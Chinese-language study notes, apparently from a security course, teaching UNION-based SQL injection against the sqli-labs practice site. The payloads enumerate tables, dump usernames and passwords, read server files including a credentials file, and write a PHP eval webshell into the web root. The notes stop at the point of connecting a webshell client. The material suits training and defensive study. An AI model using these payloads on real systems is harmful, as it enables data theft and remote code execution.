## 一、union 查询的特性
### 1、复习 Union 查询
UNION 联合查询的作用：把多个表中的数据联合在一起进行显示。
注意：使用 union 查询的 select 语句必须有用相同数量的字段，同时每条 select 语句中的字段顺序必须相同。
#### ①创建两个结构相同的学生表
`create table tb_student1(`
`id mediumint not null auto_increment,`
`name varchar(20),`
`age tinyint unsigned default 0,`
`gender enum('男','女'),`
`subject enum('ui','java','yunwei','python'),`
`primary key(id)`
`) engine=innodb default charset=utf8;`

`insert into tb_student1 values (1,'悟空',255,'男','ui');`

`create table tb_student2(`
`id mediumint not null auto_increment,`
`name varchar(20),`
`age tinyint unsigned default 0,`
`gender enum('男','女'),`
`subject enum('ui','java','yunwei','python'),`
`primary key(id)`
`) engine=innodb default charset=utf8;`

`insert into tb_student2 values (2,'唐僧',30,'男','yunwei');`

#### ②使用 UNION 进行联合查询将两个表的内容合并到一个表中显示
`select * from tb_student1 union select * from tb_student2;`
![[Pasted image 20260108102124.png]]
#### ③修改语句1
这是正常的语句 可以都显示出来，我们不按常理出牌，我们把语句 ID 值改成 -1：
`select * from tb_student1 where id=-1 union select * from tb_student2 where id=2;`
![[Pasted image 20260108102346.png]]
**总结**：-1 是不存在的，所以使用 union 查询，如果查询不到，但是也不会报错，这里只把查询到的给显示出来了。
#### ④修改语句2
`select * from tb_student1 where id=-1 union select 1,2,3,4,5;`
![[Pasted image 20260108102526.png]]
**说明**：select 之后可以接一串数字：1,2,3,4,5 只是一个例子，这串数字并不一定要按从小到大排列，也不一定从 1 开始，而是数字的个数要与字段的个数相等即可。

select 直接加数字时，可以不写后面的表名，那么它输出的内容就是我们 select 后的数字.
![[Pasted image 20260108102723.png]]
### 2、Union 联合注入
首先打开浏览器 sqlib 第一关
从第一关数据库中的表，我们可以知道其有三个字段（通过order by试出来的）
由图可知只有两个显示位（name，password） ，id 显示的位置并没有显示出来，name 和 password 显示出来了 我们可以利用 这两个显示位做一些事。我们把三个字段分别编号为1，2，3
![[Pasted image 20260108103703.png]]
#### ①让页面显示出 2，3
`http: 192.168.83.144/sqli/Less-1/?id=1' union select 1,2,3 - +`
![[Pasted image 20260108103854.png]]
页面没有变化，原因是显示位不够了
最后我们把 id 修改成 -1 就可以了
![[Pasted image 20260108104007.png]]

#### ②MySQL 中的一些函数
- version()： 查询数据库的版本
- user()：查询数据库的使用者
- database()：数据库
- system_user()：系统用户名
- session_user()：连接数据库的用户名
- current_user：当前用户名
- @@datadir：读取数据库路径
- @@basedir：mysql 安装路径
- group_concat() 连接一个组的所有字符串，并以逗号分隔每一条数据
- load_file() 读取文件
- into outfile 写入文件
- ascii() 字符串的 ASCII 代码值
- substr() 返回字符串的一部分
- length() 返回字符串的长度
- sleep() 让此语句运行 N 秒钟
#### ③常用函数
用法很简单 直接在函数前面加上 select
`http: 192.168.83.144/sqli/Less-1/?id=-1' union select 1,database(),version() - +`
![[Pasted image 20260108105243.png]]
#### ④group_concat()
group_concat() 函数功能：将 where 条件匹配到的多条记录连接成一个字符串。
语法： group_concat (str1, str2,…… )
查数据库名和表名的 sql 语句：`select table_schema,table_name from information_schema.tables where table_schema='security';`
**说明**：MySQL数据库中在Linux中数据库和表名是要区分大小写的（windows不区分），而字段名和列名是都不区分带大小写的。
![[Pasted image 20260108110654.png]]
使用 group_concat() 函数 把 table_name 表里面所有的内容一起显示出来：
`select table_schema,group_concat(table_name) from information_schema.tables where`
`table_schema='security';`
![[Pasted image 20260108110829.png]]
因为 less-1 这里显示位只有两个，而我们查到的数据不止 2 条，我们需求是把所有查到的表都
显示出来，所以我们要用 group_concat() 函数连接起来作为一行显示。
#### ⑤使用 Union 和 group_concat 函数进行 Sql 注入
把 2，3 号显示位替换成我们要查的内容
`?id=-1'union select 1,table_schema,group_concat(table_name) from information_schema.tables where table_schema ='database()'--+`
数据库名 security 最好改为 database()，因为我们可能不知道其表名

![[Pasted image 20260108111710.png]]

#### ⑥获取 Users 表中的 cloumn_name 字段名
如果我们要从 users 获取 column 字段名 sql 语句应该这样写
`select table_schema,table_name,column_name from information_schema.columns where`
`table_schema=database() and table_name='users';`
![[Pasted image 20260108113103.png]]
`?id=-1' union select 1,table_schema,group_concat(column_name) from information_schema.columns  where table_schema =database() and table_name ='users' --+`
![[Pasted image 20260108113249.png]]
#### ⑦获取 User 字段中的值
`select group_concat(username,password) from users`
![[Pasted image 20260108114128.png]]
`?id=-1' union select 1,2, group_concat(username,password) from users --+`
![[Pasted image 20260108114331.png]]
用户名密码 都连接到一块了，我们可以用 逗号分隔
`?id=-1' union select 1,2, group_concat(username,',',password) from users--+`
![[Pasted image 20260108114451.png]]
### 3、Union 联合注入总结
1. 先判断是否有注入点
2. order by 判断出有几个字段
3. 获取数据库中的表 `group_concat(table_name) from information_schema.tables wheretable_schema=database();`
4. 查询出表中字段名 `group_concat(column_name) from information_schema.columns wheretable_schema=database() and table_name=表名;`
5. 查询字段的值 group_concat(字段名,字段名) from 表名;
### 4、Union 注入 读写文件
#### ①查看 MySQL 读写文件的设置
`show global variables like 'secure%';`
![[Pasted image 20260108114951.png]]
其中secure_file_priv 这一项：
- 为NULL的时候表示禁止读写文件
- 为 空 的时候表示允许读写
- 为某个路径的时候，表示只能在这个路径进行文件读写
读写文件必备条件：
- secure_file_priv= 空
- 必须知道文件的绝对路径
- web 目录有读写入权限
#### ②修改 MySQL 配置文件，实现任意位置读写
修改 MySQL 配置文件：`vim /etc/my.cnf`
添加一句：secure_file_priv=
systemctl restart mysqld
![[Pasted image 20260108141744.png]]
#### ③Union 注入读取文件
==读取静态文件==
在 MySQL 中读取文件，使用 load_file(" 文件路径/名称 ")
在 /var/www/html 新建文件 a.txt 
`?id=-1' union select 1,2,load_file('/xp/www/a.txt') --+`
![[Pasted image 20260108142319.png]]
#### ④读取 PHP 文件
`?id=-1' union select 1,2,load_file('/xp/www/sqli/sql-connections/db-creds.inc')--+`
![[Pasted image 20260108142943.png]]
**获取失败的原因**：如果数据库成功读取了文件内容，并将其作为查询结果返回。但当这个文件内容（包含 \<?php ... ?\>标签）被返回时，如果经过的Web应用程序处理环节，仍然可能触发PHP解析。在某些配置下，即便文件后缀不是 .php（如图中的 db-creds.inc），只要文件内容以PHP标签开头，某些中间件或配置也可能导致其被尝试解析。
**解决办法**：把我们读取到的 php 文件用 hex 函数编码一下。（hex 函数可以把二进制数据转为 16 进制字符串）
`?id=-1' union select 1,2,hex(load_file('/xp/www/sqli/sql-connections/db-creds.inc'))--+`
![[Pasted image 20260108143452.png]]
最后我们把读取到的 16 禁止字符串转为文本字符串，可以打开这个网站在线转换https://www.bejson.com/convert/ox2str/
![[Pasted image 20260108143553.png]]

#### ④Union 写入文件
用 into outfile 语句用于把表数据导出到一个文本文件
用法： select * from users into outfile "/var/lib/mysql/123.txt";
把 PHP 一句话木马写入到 web 目录：
`?id=-1' union select 1,2,"<?php @eval($_POST['aaa']);?>" into outfile '/xp/www/a.php'--+`
如果写入不了我们需要修改权限:`chown -R mysql:mysql /xp/www/`
写入木马后我们用 webshell 工具连接
启动中国蚁剑：